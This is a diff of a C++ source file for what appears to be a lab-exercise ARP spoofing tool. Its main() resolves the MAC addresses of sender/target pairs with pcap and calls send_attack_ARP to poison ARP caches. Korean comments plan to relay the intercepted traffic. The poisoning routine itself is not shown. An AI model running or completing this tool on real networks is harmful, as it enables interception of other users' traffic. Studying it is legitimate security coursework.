@@ -1,20 +1,9 @@
-#include <iostream>
-#include <cstring>
-#include <cstdio>
-#include <sys/socket.h>
-#include <arpa/inet.h>
-#include <netinet/ether.h>
-#include <net/if.h>
-#include <sys/ioctl.h>
-#include <unistd.h>
-#include <linux/if_packet.h>
-#include <pcap.h>
-#include <libnet.h>
-#include <map>
 #include "ethhdr.h"
 #include "arphdr.h"
+#include "arputils.h"
 
 using namespace std;
+
 
 #pragma pack(push, 1)
 struct EthArpPacket final {
@@ -22,6 +11,112 @@ struct EthArpPacket final {
     ArpHdr arp_;
 };
 #pragma pack(pop)
+
+
+
+
+int main(int argc, char* argv[]) {
+    map<string, string> IP_MAC;
+
+    if (argc < 4 ) {
+        usage();
+        return -1;
+    }
+
+    uint8_t inface_mac[6];
+    uint8_t interface_ip[4];
+
+    char my_mac[18];
+    char my_ip[16];
+    char* dev = argv[1];
+
+    get_MAC_IP_Address(dev, inface_mac, interface_ip);
+
+    sprintf(my_mac, "%02x:%02x:%02x:%02x:%02x:%02x",
+            inface_mac[0], inface_mac[1], inface_mac[2],
+            inface_mac[3], inface_mac[4], inface_mac[5]);
+    sprintf(my_ip, "%d.%d.%d.%d",
+            interface_ip[0], interface_ip[1], interface_ip[2], interface_ip[3]);
+
+
+    cout << "----my address----" << endl;
+    printf("my mac : %s\n",my_mac);
+    printf("my ip : %s\n", my_ip);
+    int cnt = ( argc -2 ) / 2;
+    cout << "------------------" << endl;
+
+    char errbuf[PCAP_ERRBUF_SIZE];
+    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
+    if (handle == nullptr) {
+        fprintf(stderr, "pcap_open_live(%s) return nullptr - %s\n", dev, errbuf);
+        return -1;
+    }
+
+    char sender_mac[18];
+    char sender_ip[15];
+    char target_mac[18];
+    char target_ip[15];
+
+    string tmp_ip;
+    string tmp_mac;
+
+    for(int i = 0 ; i < cnt ; i++ ){
+        strcpy(sender_ip, argv[2+(i*2)]);
+        strcpy(target_ip, argv[3+(i*2)]);
+
+        cout << endl << "----Ip_info----" << endl;
+        cout << "sender_ip : " << sender_ip << endl;
+        cout << "target_ip : " << target_ip << endl;
+        cout << "---------------" << endl;
+
+        tmp_ip = sender_ip;
+        if (IP_MAC.count(tmp_ip)) {
+            strcpy(sender_mac,IP_MAC[sender_ip].c_str());
+        }else{
+            get_mac_address(handle, my_mac, my_ip, sender_ip,sender_mac);
+            tmp_mac = sender_mac;
+            IP_MAC.insert({tmp_ip, tmp_mac});
+        }
+
+        tmp_ip = target_ip;
+        if (IP_MAC.count(tmp_ip)) {
+            strcpy(target_mac, IP_MAC[tmp_ip].c_str());
+        }else{
+            get_mac_address(handle, my_mac, my_ip, target_ip,target_mac);
+            tmp_mac = target_mac;
+            IP_MAC.insert({tmp_ip, tmp_mac});
+        }
+
+        formatMacAddress(sender_mac);
+        formatMacAddress(target_mac);
+
+        cout << endl << "-------attack_" << i+1 << "--------" << endl;
+        printf("sender mac : %s\n", sender_mac);
+        printf("sender ip : %s\n",sender_ip);
+        printf("target mac : %s\n", target_mac);
+        printf("target ip : %s\n",target_ip);
+
+        send_attack_ARP(handle,  my_mac, sender_mac , target_ip, sender_ip);
+        cout << "---attack finished---" << endl;
+
+        //받은 데이터들을 바탕으로 전부 공격 패킷 날려 놓기
+
+        /*
+        여기부터는 계속 반복문 돌리면서 받는 패킷들을 전부 dst ip를 구분하여 mac주소를 수정해준뒤 전송
+        */
+    }
+
+    cout << endl << endl << "------print map-------" << endl;
+    for (const auto& pair : IP_MAC) {
+        std::cout << "Key: " << pair.first << ", Value: " << pair.second << std::endl;
+    }
+    cout << "----------------------" << endl;
+
+
+    pcap_close(handle);
+    return 0;
+}
+
 
 void usage() {
     printf("syntax: send-arp-test <interface> <target-ip>\n");
@@ -157,105 +252,3 @@ void send_attack_ARP(pcap_t* handle, char* my_mac, char* sender_mac , char* targ
     }
 }
 
-
-int main(int argc, char* argv[]) {
-    map<string, string> IP_MAC;
-
-    if (argc < 4 ) {
-        usage();
-        return -1;
-    }
-
-    uint8_t inface_mac[6];
-    uint8_t interface_ip[4];
-
-    char my_mac[18];
-    char my_ip[16];
-    char* dev = argv[1];
-
-    get_MAC_IP_Address(dev, inface_mac, interface_ip);
-
-    sprintf(my_mac, "%02x:%02x:%02x:%02x:%02x:%02x",
-            inface_mac[0], inface_mac[1], inface_mac[2],
-            inface_mac[3], inface_mac[4], inface_mac[5]);
-    sprintf(my_ip, "%d.%d.%d.%d",
-            interface_ip[0], interface_ip[1], interface_ip[2], interface_ip[3]);
-
-
-    cout << "----my address----" << endl;
-    printf("my mac : %s\n",my_mac);
-    printf("my ip : %s\n", my_ip);
-    int cnt = ( argc -2 ) / 2;
-    cout << "------------------" << endl;
-
-    char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
-    if (handle == nullptr) {
-        fprintf(stderr, "pcap_open_live(%s) return nullptr - %s\n", dev, errbuf);
-        return -1;
-    }
-
-    char sender_mac[18];
-    char sender_ip[15];
-    char target_mac[18];
-    char target_ip[15];
-
-    string tmp_ip;
-    string tmp_mac;
-
-    for(int i = 0 ; i < cnt ; i++ ){
-        strcpy(sender_ip, argv[2+(i*2)]);
-        strcpy(target_ip, argv[3+(i*2)]);
-
-        cout << endl << "----Ip_info----" << endl;
-        cout << "sender_ip : " << sender_ip << endl;
-        cout << "target_ip : " << target_ip << endl;
-        cout << "---------------" << endl;
-
-        tmp_ip = sender_ip;
-        if (IP_MAC.count(tmp_ip)) {
-            strcpy(sender_mac,IP_MAC[sender_ip].c_str());
-        }else{
-            get_mac_address(handle, my_mac, my_ip, sender_ip,sender_mac);
-            tmp_mac = sender_mac;
-            IP_MAC.insert({tmp_ip, tmp_mac});
-        }
-
-        tmp_ip = target_ip;
-        if (IP_MAC.count(tmp_ip)) {
-            strcpy(target_mac, IP_MAC[tmp_ip].c_str());
-        }else{
-            get_mac_address(handle, my_mac, my_ip, target_ip,target_mac);
-            tmp_mac = target_mac;
-            IP_MAC.insert({tmp_ip, tmp_mac});
-        }
-
-        formatMacAddress(sender_mac);
-        formatMacAddress(target_mac);
-
-        cout << endl << "-------attack_" << i+1 << "--------" << endl;
-        printf("sender mac : %s\n", sender_mac);
-        printf("sender ip : %s\n",sender_ip);
-        printf("target mac : %s\n", target_mac);
-        printf("target ip : %s\n",target_ip);
-
-        send_attack_ARP(handle,  my_mac, sender_mac , target_ip, sender_ip);
-        cout << "---attack finished---" << endl;
-
-        //받은 데이터들을 바탕으로 전부 공격 패킷 날려 놓기
-
-        /*
-        여기부터는 계속 반복문 돌리면서 받는 패킷들을 전부 dst ip를 구분하여 mac주소를 수정해준뒤 전송
-        */
-    }
-
-    cout << endl << endl << "------print map-------" << endl;
-    for (const auto& pair : IP_MAC) {
-        std::cout << "Key: " << pair.first << ", Value: " << pair.second << std::endl;
-    }
-    cout << "----------------------" << endl;
-
-
-    pcap_close(handle);
-    return 0;
-}
